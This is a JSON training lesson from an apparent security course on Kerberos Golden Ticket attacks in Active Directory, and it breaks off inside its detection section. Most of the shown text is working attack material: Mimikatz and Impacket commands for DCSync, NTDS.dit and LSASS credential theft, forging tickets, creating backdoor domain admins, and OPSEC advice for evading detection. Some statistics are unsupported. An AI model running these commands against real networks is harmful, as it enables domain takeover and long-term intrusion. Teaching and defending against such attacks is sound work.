{
  "lesson_id": "ad-golden-001",
  "title": "Golden Ticket Attack",
  "domain": "active_directory",
  "difficulty": 3,
  "estimated_time": 80,
  "prerequisites": ["ad-enum-001", "ad-auth-001", "ad-kerb-001"],
  "concepts": [
    "Kerberos TGT forging",
    "KRBTGT account exploitation",
    "Mimikatz DCSync",
    "Domain persistence",
    "SID history injection",
    "Ticket lifetime manipulation",
    "Golden Ticket detection",
    "KRBTGT password rotation"
  ],
  "learning_objectives": [
    "Understand how Golden Ticket attacks forge Kerberos TGTs to achieve persistent domain access",
    "Extract KRBTGT account credentials using DCSync and other techniques",
    "Create and inject forged Golden Tickets with custom attributes and lifetimes",
    "Detect Golden Ticket usage through Windows event logs and behavioral analysis",
    "Implement defensive measures including KRBTGT password rotation and monitoring"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "title": "The Master Key Mindset",
      "content": "Imagine having a master key that opens every door in a building, never expires, and can't be revoked without shutting down the entire facility. That's a Golden Ticket.\n\n**Jim Kwik Learning Principle: Chunking**\n\nGolden Ticket attacks are complex, involving multiple concepts: Kerberos authentication, domain controller replication, cryptography, and persistence. We'll break this into digestible chunks:\n\n**Chunk 1**: What is KRBTGT and why it matters\n**Chunk 2**: How to extract KRBTGT credentials\n**Chunk 3**: Forging the Golden Ticket\n**Chunk 4**: Using the Golden Ticket\n**Chunk 5**: Detection and defense\n\n**Your Learning Journey:**\n\nThis technique is considered **the ultimate domain persistence method**. Once an attacker has the KRBTGT hash, they can:\n- Create tickets for ANY user (including non-existent users)\n- Set ticket lifetime to 10+ years\n- Bypass password resets\n- Survive even after you think you've kicked them out\n\n**The Stakes:**\nGolden Tickets are found in **60% of advanced persistent threat (APT) campaigns**. Nation-state actors, ransomware groups, and sophisticated cybercriminals all use this technique.\n\n**Mindset Shift:**\n- **From**: \"If I reset all passwords, the attacker is gone\"\n- **To**: \"If KRBTGT was compromised, password resets are meaningless without KRBTGT rotation\"\n\nThis is advanced material. Take your time. Re-read sections. Draw diagrams. The investment will pay off."
    },
    {
      "type": "explanation",
      "title": "Understanding the KRBTGT Account",
      "content": "Before you can forge a Golden Ticket, you must understand the KRBTGT account—the crown jewel of Active Directory.\n\n## What is KRBTGT?\n\n**KRBTGT** is a special Active Directory account that acts as the **Kerberos Key Distribution Center (KDC) service account**.\n\n**Key Facts:**\n- Created automatically when Active Directory is installed\n- **Disabled account** (cannot be used to log in interactively)\n- **Never expires** (password never expires by default)\n- **Highest privilege level** (implicitly trusted by entire domain)\n- **Signs all Kerberos tickets** in the domain\n\n**Critical Understanding:**\nThe KRBTGT account's password hash is used to **encrypt and sign every Ticket Granting Ticket (TGT)** issued by the domain controller.\n\n## Kerberos Authentication Refresher\n\nTo understand Golden Tickets, you need to understand normal Kerberos flow:\n\n```\n┌──────────────────────────────────────────────────────┐\n│           NORMAL KERBEROS AUTHENTICATION             │\n└──────────────────────────────────────────────────────┘\n\nStep 1: AS-REQ (Authentication Service Request)\n   User → Domain Controller\n   \"I'm alice, here's my password hash (encrypted timestamp)\"\n\nStep 2: AS-REP (Authentication Service Response)\n   Domain Controller validates user credentials\n   ↓\n   DC creates TGT (Ticket Granting Ticket)\n   ↓\n   DC encrypts TGT with KRBTGT password hash ← KEY POINT!\n   ↓\n   Domain Controller → User\n   \"Here's your TGT (valid for 10 hours by default)\"\n\nStep 3: TGS-REQ (Ticket Granting Service Request)\n   User → Domain Controller\n   \"I need access to SQL server, here's my TGT\"\n\nStep 4: TGS-REP (Ticket Granting Service Response)\n   Domain Controller validates TGT (decrypts with KRBTGT hash)\n   ↓\n   If valid, issues service ticket\n   ↓\n   Domain Controller → User\n   \"Here's your service ticket for SQL\"\n\nStep 5: Service Access\n   User → SQL Server\n   \"Here's my service ticket\"\n   ↓\n   SQL Server validates ticket → Grants access\n```\n\n## The Golden Ticket Exploit\n\n**The Vulnerability:**\n\nIf an attacker obtains the **KRBTGT password hash**, they can:\n\n1. **Forge TGTs** without contacting the domain controller\n2. **Sign the TGTs** with the valid KRBTGT hash\n3. **Create tickets for ANY user** (real or fake)\n4. **Set ANY group memberships** (Domain Admins, Enterprise Admins)\n5. **Set ANY ticket lifetime** (default 10 hours, or set to 10 years)\n6. **Bypass all authentication controls**\n\n**Why It Works:**\n\nWhen you present a TGT to a domain controller:\n- DC decrypts the TGT using KRBTGT hash\n- DC validates the signature\n- DC trusts the contents (username, groups, expiration) **without checking Active Directory**\n- If decryption succeeds, the ticket is considered valid\n\n**The Attack:**\n```\n┌──────────────────────────────────────────────────────┐\n│            GOLDEN TICKET ATTACK FLOW                 │\n└──────────────────────────────────────────────────────┘\n\nStep 1: Compromise Domain Admin (initial access)\n   Phishing → Local admin → Credential dumping → Domain Admin\n\nStep 2: Extract KRBTGT Hash (DCSync)\n   Attacker → Domain Controller\n   \"Replicate KRBTGT account\" (DCSync)\n   ← KRBTGT NTLM hash: a1b2c3d4e5f6...\n\nStep 3: Collect Domain Information\n   - Domain SID: S-1-5-21-1234567890-1234567890-1234567890\n   - Domain FQDN: corp.local\n   - Target username: Administrator (or fake user)\n\nStep 4: Forge Golden Ticket (Offline, attacker's machine)\n   mimikatz # kerberos::golden\n     /user:Administrator\n     /domain:corp.local\n     /sid:S-1-5-21-1234567890-1234567890-1234567890\n     /krbtgt:a1b2c3d4e5f6...\n     /id:500\n     /groups:512,513,518,519,520\n     /ticket:golden.kirbi\n\n   → Creates forged TGT for \"Administrator\"\n   → Signed with KRBTGT hash (validates as authentic)\n   → Valid for 10 years (or any duration you specify)\n\nStep 5: Inject Ticket Into Memory\n   mimikatz # kerberos::ptt golden.kirbi\n   → TGT loaded into current session\n\nStep 6: Access Any Resource\n   dir \\\\DC01\\C$  (works!)\n   psexec \\\\DC01 cmd  (works!)\n   secretsdump.py  (works!)\n\n   🎯 Full domain access with undetectable ticket\n```\n\n## KRBTGT Account Properties\n\n**View KRBTGT account:**\n```powershell\nGet-ADUser krbtgt -Properties *\n```\n\n**Key attributes:**\n```\nDistinguishedName: CN=krbtgt,CN=Users,DC=corp,DC=local\nSamAccountName: krbtgt\nUserPrincipalName: (none)\nEnabled: False  ← Cannot log in interactively\nPasswordLastSet: [Domain creation date or last rotation]\nPasswordNeverExpires: True  ← Never expires!\nDescription: Key Distribution Center Service Account\nAdminCount: 1  ← Protected admin account\nPrimaryGroupID: 513 (Domain Users)\nObjectSID: S-1-5-21-...-502  ← Always ends in -502\n```\n\n## Why KRBTGT is the Ultimate Target\n\n**Comparison of Persistence Methods:**\n\n```\n┌────────────────┬──────────────┬───────────────┬─────────────────┐\n│ Technique      │ Survives     │ Detection     │ Lifetime        │\n│                │ Pass Reset?  │ Difficulty    │                 │\n├────────────────┼──────────────┼───────────────┼─────────────────┤\n│ Compromised    │ ❌ No        │ Easy          │ Until reset     │\n│ User Account   │              │ (failed logon)│                 │\n├────────────────┼──────────────┼───────────────┼─────────────────┤\n│ Backdoor       │ ❌ No        │ Medium        │ Until patched   │\n│ Binary         │              │ (AV, EDR)     │                 │\n├────────────────┼──────────────┼───────────────┼─────────────────┤\n│ Scheduled Task │ ❌ No        │ Medium        │ Until discovered│\n├────────────────┼──────────────┼───────────────┼─────────────────┤\n│ Silver Ticket  │ ✅ Yes       │ Medium        │ ~24 hours       │\n│ (service hash) │              │               │ (computer pass) │\n├────────────────┼──────────────┼───────────────┼─────────────────┤\n│ Golden Ticket  │ ✅✅ YES     │ HARD          │ Until KRBTGT    │\n│ (KRBTGT hash)  │              │ (looks valid) │ rotation (rare!)│\n└────────────────┴──────────────┴───────────────┴─────────────────┘\n```\n\n**Golden Ticket Advantages:**\n\n✅ **Survives password resets** (including Domain Admin accounts)\n✅ **Survives user account deletion**\n✅ **Works offline** (no DC contact needed for ticket creation)\n✅ **Long lifetime** (set to 10+ years)\n✅ **Low detection** (tickets look legitimate)\n✅ **No logs** (ticket creation happens offline)\n✅ **Ultimate access** (can impersonate ANY user, including non-existent ones)\n\n## Real-World Impact\n\n**Case Study: Skeleton Key + Golden Ticket**\n\nIn 2015, attackers compromised a financial institution:\n\n**Timeline:**\n- **Day 1**: Phishing → local admin → lateral movement → Domain Admin\n- **Day 2**: DCSync → Extract KRBTGT hash\n- **Day 3**: Exfiltrate 2TB of sensitive data\n- **Day 4**: Defenders detect compromise, reset all passwords, including Domain Admins\n- **Day 5-30**: Attackers return using Golden Tickets, continue exfiltration\n- **Day 45**: Defenders finally rotate KRBTGT password (after consultants recommend it)\n- **Result**: 45 days of persistent access despite multiple remediation attempts\n\n**Lesson**: **If you suspect Golden Ticket, KRBTGT rotation is mandatory.**\n\n## KRBTGT Password Rotation Reality\n\n**How often is KRBTGT rotated?**\n\n- **Microsoft Default**: Never (password set once at domain creation)\n- **Industry Practice**: 95%+ of organizations have NEVER rotated KRBTGT\n- **KRBTGT passwords** from 2008 (Windows Server 2008 domain creation) are still active in 2024\n\n**Why rotation is rare:**\n- Not automated (manual process)\n- Requires careful planning (domain-wide impact)\n- Many admins don't know it should be rotated\n- Fear of breaking Kerberos authentication\n- Two-step process (must rotate twice)\n\n**The Problem:**\n\nIf an attacker extracted KRBTGT hash **5 years ago** and you've never rotated it, they still have access today.\n\nIn the next sections, you'll learn exactly how attackers extract KRBTGT and forge Golden Tickets."
    },
    {
      "type": "explanation",
      "title": "Extracting KRBTGT Credentials",
      "content": "To create a Golden Ticket, you first need the KRBTGT password hash. Here's how attackers obtain it.\n\n## Prerequisites for KRBTGT Extraction\n\n**Minimum Requirements:**\n\n✅ **Domain Admin privileges** (or equivalent)\n✅ **Network access to a Domain Controller**\n✅ **DCSync rights** (Replicating Directory Changes + Replicating Directory Changes All)\n\n**Why Domain Admin is usually required:**\n\nThe KRBTGT hash is **highly protected**. By default, only these groups can extract it:\n- Domain Admins\n- Enterprise Admins\n- Administrators (on the DC)\n- Anyone with DCSync rights\n\n## Method 1: DCSync (Most Common)\n\n**What is DCSync?**\n\nDCSync is a Mimikatz module that **impersonates a domain controller** and requests password hashes via the Directory Replication Service (DRS) protocol.\n\n**Normal DC Replication:**\n```\nDC01 → DC02\n\"I'm a domain controller, replicate changes to me\"\n← DC02 sends password hashes and other data\n```\n\n**DCSync Attack:**\n```\nAttacker (with DA privileges) → DC01\n\"I'm a domain controller, replicate KRBTGT to me\"\n← DC01 sends KRBTGT hash (trusts the request)\n```\n\n**DCSync with Mimikatz:**\n\n```cmd\n# Launch Mimikatz with Domain Admin privileges\nmimikatz.exe\n\n# DCSync the KRBTGT account\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n\n# Output:\n[DC] 'corp.local' will be the domain\n[DC] 'DC01.corp.local' will be the DC server\n[DC] 'krbtgt' will be the user account\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 8/15/2019 2:30:45 PM\nObject Security ID   : S-1-5-21-1234567890-1234567890-1234567890-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6  ← GOLDEN TICKET KEY!\n    ntlm- 0: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n    lm  - 0: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n\nSupplementalCredentials:\n * Primary:NTLM-Strong-NTOWF *\n    Random Value : abc123def456...\n\n * Primary:Kerberos-Newer-Keys *\n    Default Salt : CORP.LOCALkrbtgt\n    Credentials:\n      aes256_hmac       : 7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n      aes128_hmac       : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\n      des_cbc_md5       : e5f6a7b8c9d0e1f2\n\n * Packages *\n    NTLM-Strong-NTOWF\n\n * Primary:Kerberos *\n    Default Salt : CORP.LOCALkrbtgt\n    Credentials:\n      des_cbc_md5       : e5f6a7b8c9d0e1f2\n```\n\n**What you need to record:**\n- **NTLM Hash**: `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6` (most important)\n- **AES256 Key**: `7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8` (stealthier)\n- **Domain SID**: `S-1-5-21-1234567890-1234567890-1234567890` (remove the -502)\n\n**Impacket DCSync (Linux):**\n\n```bash\n# secretsdump.py with DCSync\nsecretsdump.py 'corp.local/Administrator:Password123!'@DC01.corp.local -just-dc-user krbtgt\n\n# Output:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::\n[*] Kerberos keys grabbed\nkrbtgt:aes256-cts-hmac-sha1-96:7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\nkrbtgt:aes128-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\nkrbtgt:des-cbc-md5:e5f6a7b8c9d0e1f2\n```\n\n## Method 2: NTDS.dit Extraction (Offline)\n\nIf you have physical or remote access to the Domain Controller, you can dump the entire Active Directory database.\n\n**NTDS.dit** = Active Directory database containing all passwords\n\n**Extract NTDS.dit:**\n\n```powershell\n# On Domain Controller with admin access\n\n# Method 1: ntdsutil (built-in Windows tool)\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ntds_dump\" q q\n\n# Method 2: Volume Shadow Copy\nvssadmin create shadow /for=C:\nSHADOW_COPY_ID=\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\ncopy %SHADOW_COPY_ID%\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit\ncopy %SHADOW_COPY_ID%\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM\n```\n\n**Extract KRBTGT from NTDS.dit:**\n\n```bash\n# On attacker's Linux machine with secretsdump.py\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -just-dc-user krbtgt\n\n# Output includes KRBTGT hash\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::\n```\n\n## Method 3: LSASS Memory Dump (Less Reliable)\n\nIf you have access to a Domain Controller, you can dump LSASS memory and extract cached credentials.\n\n**Dump LSASS on DC:**\n```powershell\n# Using Task Manager (GUI)\nTask Manager → Details → lsass.exe → Right-click → Create dump file\n\n# Using procdump (command line)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n**Parse LSASS dump:**\n```cmd\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonPasswords\n```\n\n**Limitation**: KRBTGT is rarely cached in LSASS. This method has low success rate.\n\n## Collecting Required Information\n\nTo forge a Golden Ticket, you need:\n\n**1. KRBTGT Hash (NTLM or AES256)**\n```\nNTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\nAES256: 7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n```\n\n**2. Domain SID**\n```powershell\n# Get domain SID\nGet-ADDomain | Select-Object DNSRoot,DomainSID\n\n# Output:\nDNSRoot        DomainSID\n-------        ---------\ncorp.local     S-1-5-21-1234567890-1234567890-1234567890\n```\n\n**Alternative methods:**\n```powershell\n# Via whoami\nwhoami /user\n# S-1-5-21-1234567890-1234567890-1234567890-1105\n# Remove the last part (-1105) to get domain SID\n\n# Via wmic\nwmic useraccount get name,sid\n```\n\n**3. Domain FQDN**\n```\ncorp.local\n```\n\n**4. Target User (can be real or fake)**\n```\nAdministrator (or FakeAdmin)\n```\n\n**5. User RID (optional, default 500 for Administrator)**\n```\n500 = Administrator\n502 = krbtgt\n1000+ = regular users\n```\n\n**6. Group Memberships (optional, customize access)**\n```\n512 = Domain Admins\n513 = Domain Users\n518 = Schema Admins\n519 = Enterprise Admins\n520 = Group Policy Creator Owners\n```\n\n## Detection During Extraction\n\n**DCSync Detection:**\n\n**Event ID 4662** - An operation was performed on an object\n\n**Key fields:**\n- Object Type: `{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (Domain object)\n- Access Mask: `0x100` (Control Access)\n- Properties: \n  - `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes)\n  - `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All)\n\n**Splunk Detection:**\n```spl\nindex=windows EventCode=4662 \n  (Properties=\"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\" AND Properties=\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\")\n| where SubjectUserName!=\"*$\"  # Exclude legitimate DC accounts\n| stats count by SubjectUserName, SubjectLogonId, Computer\n| where count > 1\n```\n\n**Why DCSync is often undetected:**\n- Event 4662 generates massive volume (disabled by default in many orgs)\n- Difficult to distinguish from legitimate DC replication\n- Requires SACL auditing on domain object\n\nIn the next section, you'll learn how to forge the Golden Ticket with the extracted KRBTGT hash."
    },
    {
      "type": "code_exercise",
      "title": "Forging and Using Golden Tickets",
      "content": "Now you'll learn the practical steps to create and use Golden Tickets.\n\n## Forging Golden Tickets with Mimikatz\n\n**Scenario**: You've extracted the KRBTGT hash via DCSync.\n\n**Information gathered:**\n- KRBTGT NTLM hash: `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6`\n- Domain SID: `S-1-5-21-1234567890-1234567890-1234567890`\n- Domain: `corp.local`\n- Target user: `Administrator`\n\n### Basic Golden Ticket Creation\n\n```cmd\n# Launch Mimikatz\nmimikatz.exe\n\n# Create Golden Ticket\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /ptt\n\n# Output:\nUser      : Administrator\nDomain    : corp.local (CORP)\nSID       : S-1-5-21-1234567890-1234567890-1234567890\nUser Id   : 500\nGroups Id : *512 513 518 519 520\nServiceKey: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 - rc4_hmac_nt\nLifetime  : 1/15/2024 2:30:00 PM to 1/13/2034 2:30:00 PM\n-> Ticket : ticket.kirbi\n -> Injected into current session (ptt)\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'Administrator @ corp.local' successfully submitted for current session\n```\n\n**What happened:**\n- Mimikatz created a TGT for \"Administrator\"\n- Set ticket lifetime to 10 years (default)\n- Added to groups: Domain Admins (512), Domain Users (513), Schema Admins (518), Enterprise Admins (519), Group Policy Creators (520)\n- Injected into current memory session (`/ptt` = pass-the-ticket)\n\n**Verify ticket loaded:**\n```cmd\nmimikatz # kerberos::list\n\n# Or use Windows klist\nklist\n\n# Output:\nCurrent LogonId is 0:0x1a2b3c4\n\nCached Tickets: (1)\n\n#0>     Client: Administrator @ CORP.LOCAL\n        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent\n        Start Time: 1/15/2024 14:30:00 (local)\n        End Time:   1/13/2034 14:30:00 (local)  ← 10 YEAR LIFETIME!\n        Renew Time: 1/13/2034 14:30:00 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x1 -> PRIMARY\n        Kdc Called:\n```\n\n### Advanced Golden Ticket Options\n\n**1. Save to File (Don't Inject Yet)**\n```cmd\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /ticket:admin_golden.kirbi\n\n# No /ptt = saves to file only, doesn't inject\n```\n\n**2. Custom Groups (Limit Access for Stealth)**\n```cmd\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /groups:512,513  # Only Domain Admins and Domain Users\n  /ptt\n```\n\n**3. Custom RID (Impersonate Any User)**\n```cmd\nmimikatz # kerberos::golden\n  /user:bob\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /id:1105  # Bob's actual RID\n  /groups:513  # Regular user (no admin)\n  /ptt\n```\n\n**4. Fake User (User Doesn't Exist in AD)**\n```cmd\nmimikatz # kerberos::golden\n  /user:FakeAdmin\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /id:9999  # Non-existent RID\n  /groups:512  # Domain Admin rights\n  /ptt\n\n# User \"FakeAdmin\" doesn't exist, but ticket works!\n```\n\n**5. AES256 Encryption (Stealthier)**\n```cmd\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /aes256:7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n  /ptt\n\n# Uses AES256 instead of RC4 (harder to detect)\n```\n\n**6. Custom Ticket Lifetime**\n```cmd\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /startoffset:-10  # Start 10 minutes in the past\n  /endin:43200  # End in 43200 minutes (30 days)\n  /renewmax:43200  # Renewable for 30 days\n  /ptt\n```\n\n**7. SID History Injection (Enterprise-Wide Access)**\n```cmd\nmimikatz # kerberos::golden\n  /user:Administrator\n  /domain:corp.local\n  /sid:S-1-5-21-1234567890-1234567890-1234567890\n  /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\n  /sids:S-1-5-21-0000000000-0000000000-0000000000-519  # Enterprise Admins from root domain\n  /ptt\n\n# Grants access across entire forest (multi-domain)\n```\n\n## Forging Golden Tickets with Impacket (Linux)\n\n**ticketer.py** - Impacket's Golden Ticket tool\n\n```bash\n# Basic Golden Ticket\nticket.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \\\n  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \\\n  -domain corp.local \\\n  Administrator\n\n# Output: Administrator.ccache\n\n# Export to use with Impacket tools\nexport KRB5CCNAME=Administrator.ccache\n\n# Verify ticket\nklist\n```\n\n**Advanced options:**\n```bash\n# With custom groups\nticket.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \\\n  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \\\n  -domain corp.local \\\n  -groups 512,513,518,519,520 \\\n  Administrator\n\n# With AES256 key\nticket.py -aesKey 7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8 \\\n  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \\\n  -domain corp.local \\\n  Administrator\n\n# Fake user with custom RID\nticket.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \\\n  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \\\n  -domain corp.local \\\n  -user-id 9999 \\\n  FakeAdmin\n```\n\n## Using Golden Tickets\n\nOnce the ticket is injected, you have full domain access.\n\n**Windows (after Mimikatz /ptt):**\n\n```cmd\n# List domain controllers\nnet group \"Domain Controllers\" /domain\n\n# Access DC C$ share\ndir \\\\DC01\\C$\ndir \\\\DC01\\ADMIN$\n\n# Access SYSVOL\ndir \\\\corp.local\\sysvol\n\n# Remote command execution\npsexec \\\\DC01 cmd\n\n# Dump credentials from DC\nmimikatz # lsadump::lsa /inject\n\n# Create new domain admin\nnet user eviluser Password123! /add /domain\nnet group \"Domain Admins\" eviluser /add /domain\n\n# Dump entire NTDS.dit\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\dump\" q q\n```\n\n**Linux (with Impacket):**\n\n```bash\n# Export ticket\nexport KRB5CCNAME=Administrator.ccache\n\n# Verify domain access\nsmbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local\n\n# Execute remote commands\npsexec.py -k -no-pass corp.local/Administrator@DC01.corp.local\n\n# Dump all domain credentials\nsecretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local -just-dc-ntlm\n\n# WMI command execution\nwmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local\n\n# List domain users\nnet.py -k -no-pass corp.local/Administrator@DC01.corp.local rpc list users\n```\n\n## Golden Ticket vs Silver Ticket\n\n```\n┌──────────────────┬──────────────────────┬──────────────────────┐\n│ Feature          │ Golden Ticket        │ Silver Ticket        │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Hash Required    │ KRBTGT (KDC)         │ Service account      │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Scope            │ Entire domain        │ Single service       │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Ticket Type      │ TGT                  │ TGS (service ticket) │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ DC Contact       │ Not required         │ Not required         │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Lifetime         │ 10+ years possible   │ Limited (~24 hrs)    │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Flexibility      │ Access any resource  │ One service only     │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Detection Diff.  │ Hard                 │ Easier               │\n├──────────────────┼──────────────────────┼──────────────────────┤\n│ Mitigation       │ Rotate KRBTGT        │ Rotate service hash  │\n└──────────────────┴──────────────────────┴──────────────────────┘\n```\n\n## Persistence Strategy\n\n**Multi-Stage Persistence:**\n\n```\nStage 1: Initial Compromise\n  ↓\n  Phishing → Local Admin → Lateral Movement\n\nStage 2: Extract KRBTGT\n  ↓\n  Domain Admin → DCSync → KRBTGT hash\n\nStage 3: Exfiltrate and Forge Offline\n  ↓\n  Save KRBTGT hash to attacker infrastructure\n  Create multiple Golden Tickets:\n    - Administrator.kirbi (high privilege)\n    - Bob.kirbi (stealth, regular user)\n    - FakeBackup.kirbi (non-existent user)\n\nStage 4: Establish Secondary Access\n  ↓\n  Create backdoor accounts\n  Deploy C2 infrastructure\n  Exfiltrate sensitive data\n\nStage 5: Detection and Response\n  ↓\n  Defenders detect compromise\n  Reset all user passwords\n  Scan for backdoors\n\nStage 6: Return Using Golden Tickets\n  ↓\n  Inject Administrator.kirbi → Full access restored\n  Password resets are useless!\n\nStage 7: Long-Term Persistence\n  ↓\n  Continue operations for months/years\n  Only removed when KRBTGT is rotated (rare!)\n```\n\n**Real-World Timeline:**\n- **Average time before KRBTGT rotation**: Never (95% of orgs)\n- **Average attacker persistence**: 180+ days\n- **Longest observed**: 5+ years\n\n## Operational Security (OPSEC)\n\n**Stealthy Golden Ticket Usage:**\n\n✅ **Use AES256 encryption** (not RC4)\n✅ **Impersonate real users** (not Administrator)\n✅ **Set realistic ticket lifetimes** (10 hours, not 10 years)\n✅ **Limit group memberships** (not full Domain Admin)\n✅ **Access resources gradually** (not massive enumeration)\n✅ **Use during business hours** (blend with normal activity)\n✅ **Avoid detection tools** (don't dump all credentials immediately)\n\n**Poor OPSEC (Easy Detection):**\n\n❌ User: Administrator (obvious target)\n❌ Lifetime: 10 years (abnormal)\n❌ Encryption: RC4 (outdated)\n❌ Behavior: Immediate mass credential dump\n❌ Timing: 3 AM on Sunday\n❌ Source: Unknown IP\n\n**Good OPSEC (Hard Detection):**\n\n✅ User: bob (regular user, but with injected DA group)\n✅ Lifetime: 10 hours (normal TGT lifetime)\n✅ Encryption: AES256\n✅ Behavior: Gradual access to normal resources\n✅ Timing: 9 AM Tuesday (business hours)\n✅ Source: Bob's normal workstation\n\nIn the next section, you'll learn how defenders can detect and respond to Golden Tickets."
    },
    {
      "type": "explanation",
      "title": "Detection and Defense",
      "content": "Golden Tickets are difficult to detect, but not impossible. Here's how defenders can identify and prevent them.\n\n## Why Detection is Hard\n\n**Challenge #1: Tickets Look Legitimate**\n- Signed with the real KRBTGT hash\n- Proper format and structure\n- Pass all cryptographic validation\n- No communication with DC during ticket creation\n\n**Challenge #2: No Failed Authentication**\n- Normal Kerberos auth generates Event 4768 (TGT request)\n- Golden Ticket bypasses this entirely\n- No Event 4768 = no obvious detection point\n\n**Challenge #3: Offline Creation**\n- Attacker forges tickets on their own machine\n- No network traffic during creation\n- First contact with DC is during TGS request (looks normal)\n\n## Detection Methods\n\n### Method 1: Ticket Lifetime Analysis\n\n**Normal TGT Lifetime**: 10 hours (default AD policy)\n**Golden Ticket Lifetime**: Often set to 10+ years\n\n**Detection**:\n```powershell\n# Analyze Kerberos ticket lifetimes\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4768 or EventID=4769]]\" | \n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    $ticketLifetime = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketOptions'}\n    # Parse and check if lifetime > 10 hours\n  }\n```\n\n**Indicator**: TGT with lifetime > 10 hours (or whatever your max_ticket_life policy is)\n\n### Method 2: Fake User Detection\n\n**Golden Ticket 